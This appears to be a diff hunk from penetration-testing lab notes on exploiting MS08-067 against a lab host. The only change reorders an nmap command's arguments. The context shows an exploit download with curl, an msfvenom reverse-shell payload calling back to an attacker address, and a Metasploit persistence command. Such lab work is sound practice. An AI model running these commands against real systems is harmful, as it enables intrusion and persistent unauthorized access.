@@ -1055,7 +1055,7 @@ Finally, get persistence with Metasploit: `run persistence -X`
 ```
 nmap -T4 -A -p- 10.10.10.4 -oN nmap.log -v
 nmap -p139,445,3389 -O 10.10.10.4 -v
-nmap -p445 --script smb-vuln-ms08-067 -Pn 10.10.10.4 -v
+nmap --script smb-vuln-ms08-067 -p445 -Pn 10.10.10.4 -v
 
 curl https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py -o ms08-067.py
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.19 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
